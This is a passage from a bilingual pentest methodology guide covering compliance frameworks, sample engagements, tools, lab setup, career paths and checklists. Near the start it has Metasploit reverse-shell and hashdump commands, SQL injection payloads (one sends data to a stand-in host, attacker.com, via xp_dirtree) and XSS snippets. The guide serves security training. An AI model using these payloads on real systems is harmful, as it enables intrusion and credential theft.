search type:[exploit](../raw/m3t4spl01t.md#exploits) platform:windows [cve](../raw/s3c-f0nd4m3nt0s.md#cve):2021
search apache

# Payloads
[set](../raw/ph1sh1ng.md#social-engineering-toolkit) [payload](../raw/m3t4spl01t.md#payloads) windows/[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64)/[meterpreter](../raw/m3t4spl01t.md#meterpreter)/reverse_tcp
set PAYLOAD linux/x64/shell_reverse_tcp

# Multi-handler
use exploit/multi/handler
set LHOST tun0
set LPORT 443
exploit -j -z

# Post
sessions -l
sessions -i 1
run post/windows/gather/hashdump
run post/linux/gather/hashdump
```

### SQL Injection Quick Reference
```sql
-- Detection
' OR 1=1 --
' OR '1'='1
' AND 1=1 --
' AND 1=2 --

-- UNION based
' UNION SELECT null,null --
' UNION SELECT null,table_name,null FROM information_schema.tables --

-- Blind (time-based)
' WAITFOR DELAY '00:00:05'--
' OR IF(1=1,SLEEP(5),0)--

-- Out-of-band
' EXEC xp_dirtree '\\attacker.[com](../raw/w1n-s9bsyst3ms.md#com)\share'--
```

### XSS Quick Reference
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---

## 24. Compliance y Regulaciones

### PCI-DSS
- Pentest anual obligatorio
- Pentest trimestral si hay cambios significativos
- Alcance: CDE (Cardholder Data Environment)
- Metodologia: Segun estandar
- ASV para escaneos trimestrales

### HIPAA
- Risk assessment obligatorio
- Pentest como parte del risk assessment
- Proteccion de ePHI
- Documentacion de controles

### ISO 27001
- Pentest dentro del Anexo A (A.12.6.1)
- Periodicidad definida por la organizacion
- Parte del ISMS

### SOC2
- Pentest como parte de los controles
- Trust Service Criteria: Security, Availability, Confidentiality, Privacy
- Tipo I: Diseno de controles
- Tipo II: Eficacia operativa

### NIST Cybersecurity Framework
- Identify: Asset management, risk assessment
- Protect: Access control, data security
- Detect: Continuous monitoring
- Respond: Response planning
- Recover: Recovery planning

---

## 25. Escenarios Reales de Pentest

### Escenario 1: Empresa Fintech

**Alcance**: 50 IPs publicas, 3 apps web, 1 API REST, 1 mobile app
**Tipo**: Grey Box (credenciales de usuario)
**Duracion**: 2 semanas
**Equipo**: 2 pentesters

**Hallazgos Tipicos**:
1. SQL Injection en API de transacciones (Critico)
2. Insecure Direct Object Reference en transferencias (Alto)
3. Weak JWT secret en autenticacion (Alto)
4. Missing rate limiting en login (Medio)
5. Hardcoded API keys en mobile APK (Alto)
6. SSL certificate expiration (Medio)

**Impacto de Negocio**:
- Exposicion de datos financieros de clientes
- Transferencias no autorizadas
- Account takeover
- Cumplimiento PCI-DSS en riesgo

### Escenario 2: Empresa de Salud (Hospital)

**Alcance**: Red interna /24, 200 endpoints, EMR system, PACS
**Tipo**: White Box (credenciales de admin, diagramas de red)
**Duracion**: 3 semanas
**Equipo**: 3 pentesters

**Hallazgos Tipicos**:
1. RCE en sistema EMR legacy (Critico)
2. Default credentials en switches Cisco (Alto)
3. Segmentacion de red insuficiente (Alto)
4. Medical device sin parches (Critico)
5. No encryption en datos de pacientes (Alto)
6. Active Directory misconfiguration (Alto)

**Impacto de Negocio**:
- Exposicion de PHI (Protected Health Information)
- Multas HIPAA de hasta $50,000 por registro
- Riesgo para la seguridad de pacientes
- Interrupcion de servicios medicos

### Escenario 3: E-commerce / Retail

**Alcance**: 20 IPs, plataforma Magento, API de pagos, warehouse system
**Tipo**: Black Box
**Duracion**: 2 semanas
**Equipo**: 2 pentesters

**Hallazgos Tipicos**:
1. SQL Injection en producto search (Critico)
2. Price manipulation en checkout (Alto)
3. XSS en reviews (Medio)
4. Race condition en inventory (Alto)
5. Weak encryption en passwords (Medio)
6. Session hijacking via cookie (Alto)

**Impacto de Negocio**:
- Perdida de datos de tarjetas de credito
- Manipulacion de precios
- Fraude en compras
- Danos a la reputacion de la marca

### Escenario 4: Cloud-Native SaaS

**Alcance**: AWS account, 3 microservicios, serverless functions, RDS
**Tipo**: Grey Box (acceso a cuenta AWS de test)
**Duracion**: 1 semana
**Equipo**: 1 pentester cloud

**Hallazgos Tipicos**:
1. S3 bucket publicamente accesible (Critico)
2. IAM role con permisos excesivos (Alto)
3. Lambda function con secretos hardcodeados (Alto)
4. API Gateway sin rate limiting (Medio)
5. RDS publicamente accesible (Critico)
6. CloudTrail deshabilitado (Medio)

**Impacto de Negocio**:
- Data breach via S3
- Cloud account takeover
- Costos inesperados por cryptomining
- Compliance (SOC2) no cumplido

---

## Conclusion

Las metodologias de pentest no son solo teoria. Son herramientas practicas que estructuran tu trabajo, te cubren legalmente, y aseguran que no te saltees nada importante.

No importa si usas PTES, OWASP, NIST, u OSSTMM. Lo importante es tener un proceso definido y seguirlo consistentemente. Cada framework tiene sus fortalezas:

- **PTES**: Para el pentester practico que quiere un proceso completo
- **OWASP**: Indispensable para web applications
- **NIST**: Para entornos gubernamentales o que requieren procedimientos formales
- **OSSTMM**: Para auditorias academicas o cuando necesitas metricas formales

El secreto no es cual framework usas, sino como lo aplicas. Un pentester con metodologia siempre va a dar mejores resultados que uno que tira herramientas al azar.

Recorda siempre: la metodologia te da la estructura, pero el criterio y la experiencia son los que hacen la diferencia.

---

*"El exito en pentesting no esta en las herramientas, esta en el proceso."*

---

## 26. Pentest Tools Comparison Matrix

| Herramienta | Tipo | Precio | Plataforma | Facilidad |
|-------------|------|--------|------------|-----------|
| Nessus Pro | Vuln Scanner | $$$ | Win/Linux | Media |
| OpenVAS | Vuln Scanner | Gratis | Linux | Dificil |
| Qualys | Vuln Scanner | $$$$ | Cloud | Facil |
| Burp Suite Pro | Web Proxy | $$$ | Cross | Facil |
| OWASP ZAP | Web Proxy | Gratis | Cross | Facil |
| Metasploit Pro | Exploit | $$$$ | Linux | Facil |
| Metasploit Community | Exploit | Gratis | Linux | Facil |
| Cobalt Strike | Red Team | $$$$ | Windows | Media |
| Sliver | C2/RTE | Gratis | Cross | Media |
| Empire | Post-Exploit | Gratis | Linux | Media |
| BloodHound | AD Analysis | Gratis | Win/Linux | Facil |
| CrackMapExec | AD Exploit | Gratis | Linux | Media |
| Impacket | AD Protocols | Gratis | Linux | Dificil |

## 27. Pentest Lab Setup

### Kali Linux (Recomendado)
```bash
# Herramientas pre-instaladas
apt update && apt full-upgrade -y

# Herramientas adicionales
apt install [bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound) neo4j crackmapexec evil-winrm [chisel](../raw/l1n9x-pr1v3sc.md#chisel) [ligolo](../raw/l1n9x-pr1v3sc.md#ligolo-ng)-ng -y

# Instalar desde GitHub
git clone [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.com/ropnop/kerbrute.git
git clone https://github.com/SecureAuthCorp/impacket.git
git clone https://github.com/BloodHoundAD/BloodHound.git

# Python tools
pip3 install mitmproxy2swagger
pip3 install pymetasploit3
pip3 install lsassy
pip3 install certipy-ad
```

### Parrot OS (Alternativa)
```bash
# Actualizar
[sudo](../raw/l1n9x-pr1v3sc.md#sudo) parrot-upgrade

# Instalar herramientas adicionales
sudo apt install bloodhound neo4j chisel -y
sudo apt install crackmapexec -y
```

### Windows para Pentest
```powershell
# Windows Terminal
winget install Microsoft.WindowsTerminal

# WSL2 con Kali
wsl --install -d kali-linux

# Herramientas nativas Windows
# - Sysinternals Suite
# - PowerShell 7
# - Visual Studio Code
# - Burp Suite
# - Fiddler
# - Wireshark
```

### Virtual Lab Topology
```
[Kali/Parrot] --- [Internet] --- [Target Network]
     |                       |
     |                       +--- [Web Server]
     |                       +--- [DB Server]
     |                       +--- [AD DC]
     |                       +--- [File Server]
     |                       +--- [Workstations]
     |
     +--- [Proxmox/VMware/ Hyper-V]

Recommended lab platforms:
- Proxmox VE (Free, Open Source)
- VMware Workstation/ESXi
- VirtualBox (Free)
- Hyper-V (Windows)
```

## 28. Pentest Career Path

### Entry Level (0-2 years)
- Skills: Basic networking, Linux, Windows, Python
- Tools: Nmap, Metasploit, Burp Suite Community
- Certifications: Security+, CEH, eJPT
- Role: Junior Pentester, Security Analyst
- Salary: $40k - $70k

### Mid Level (2-5 years)
- Skills: Web app pentesting, AD attacks, scripting
- Tools: BloodHound, CrackMapExec, Empire
- Certifications: OSCP, PNPT, GPEN
- Role: Pentester, Security Consultant
- Salary: $70k - $110k

### Senior Level (5-8 years)
- Skills: Red teaming, exploit dev, cloud security
- Tools: Cobalt Strike, Custom tooling
- Certifications: OSEE, GXPN, OSCE3
- Role: Senior Pentester, Red Team Lead
- Salary: $110k - $150k

### Lead/Manager (8+ years)
- Skills: Program management, client management, team lead
- Certifications: CISSP, CISM
- Role: Practice Lead, Security Manager
- Salary: $150k - $200k+


---

## 29. Pentest Checklists Detalladas

### 29.1. Pre-Engagement
- [ ] Define scope (IPs, URLs, apps, APIs, wireless, physical)
- [ ] Define rules of engagement (hours, contacts, limits)
- [ ] Define type of test (black/grey/white box)
- [ ] Sign NDA and SOW
- [ ] Receive credentials (if grey/white box)
- [ ] Setup VPN or remote access
- [ ] Confirm emergency contacts
- [ ] Confirm escalation procedure

### 29.2. External Pentest
- [ ] DNS enumeration (A, AAAA, MX, NS, TXT, SOA, AXFR)
- [ ] Subdomain discovery (amass, subfinder, crt.sh)
- [ ] Port scanning (TCP full, UDP top 100)
- [ ] Service fingerprinting (versions, banners)
- [ ] Vulnerability scanning (Nessus, OpenVAS, NSE)
- [ ] Web application testing (per OWASP)
- [ ] API testing (REST, GraphQL, SOAP)
- [ ] SSL/TLS testing (ciphers, protocols, certs)
- [ ] Cloud asset discovery
- [ ] Social engineering testing (if in scope)

### 29.3. Internal Pentest
- [ ] Network discovery (arp-scan, netdiscover)
- [ ] Active Directory enumeration (BloodHound, ldapsearch)
- [ ] SMB enumeration (shares, null session, RPC)
- [ ] SNMP enumeration (community strings)
- [ ] LLMNR/NBT-NS poisoning (Responder)
- [ ] IPv6 attack surface
- [ ] VLAN hopping testing
- [ ] DHCP starvation testing
- [ ] Wireless testing (if in scope)
- [ ] Physical security testing (if in scope)

### 29.4. Web Application Pentest
- [ ] Information gathering (Wappalyzer, WhatWeb, robots.txt)
- [ ] Configuration testing (HTTPS, headers, CORS)
- [ ] Authentication testing (bypass, brute force, MFA)
- [ ] Authorization testing (IDOR, privilege escalation)
- [ ] Session management (cookies, JWT, CSRF)
- [ ] Input validation (XSS, SQLi, LFI, SSTI, command injection)
- [ ] Business logic testing (race conditions, parameter manipulation)
- [ ] Cryptography testing (weak encryption, padding oracle)
- [ ] API testing (authentication, rate limiting, injection)
- [ ] Client-side testing (DOM XSS, CORS, WebSockets)
- [ ] File upload testing (extension, content-type, size)
- [ ] SSRF testing (internal services, cloud metadata)

### 29.5. Mobile App Pentest
- [ ] Static analysis (APK decompilation, manifest review)
- [ ] Dynamic analysis (traffic interception, runtime manipulation)
- [ ] Insecure data storage (shared preferences, SQLite, plist)
- [ ] Insecure authentication (hardcoded tokens, weak auth)
- [ ] Insecure communication (no SSL, weak SSL)
- [ ] Side-channel data leakage (logs, clipboard, cache)
- [ ] Binary protection (root detection, anti-tampering)
- [ ] API endpoint testing

### 29.6. Cloud Pentest (AWS)
- [ ] S3 bucket enumeration and permissions
- [ ] IAM role and policy analysis
- [ ] EC2 instance metadata service
- [ ] Lambda function review
- [ ] RDS public access
- [ ] CloudTrail and logging
- [ ] VPC flow logs
- [ ] Security group rules
- [ ] KMS key permissions
- [ ] Route53 enumeration

### 29.7. Post-Pentest
- [ ] Remove all backdoors/persistence
- [ ] Restore modified configurations
- [ ] Return credentials to client
- [ ] Delete exfiltrated test data
- [ ] Archive evidence securely
- [ ] Write final report
- [ ] Present findings to client
- [ ] Schedule re-test
- [ ] Invoice client
- [ ] Lessons learned internally

## 30. Final Notes

### Key Takeaways
1. **Methodology matters**: A structured approach beats random testing every time
2. **Document everything**: Your memory is not reliable
3. **Communication is key**: Regular updates keep clients happy
4. **Quality over quantity**: One well-documented critical finding is worth more than 20 low-quality ones
5. **Always improve**: Each pentest teaches you something new
6. **Stay ethical**: Only test systems you have permission to test
7. **Keep learning**: The security landscape changes every day

### Recommended Next Steps
1. Practice in labs (HTB, THM, VulnHub)
2. Get certified (OSCP, PNPT, GPEN)
3. Write writeups to solidify knowledge
4. Join the infosec community (Discord, Reddit, conferences)
5. Specialize in an area (web, AD, cloud, mobile)
6. Build your own lab for practice
7. Contribute to open source security tools

---

*"The best pentesters don't just find vulnerabilities - they help organizations understand and fix them."*
```
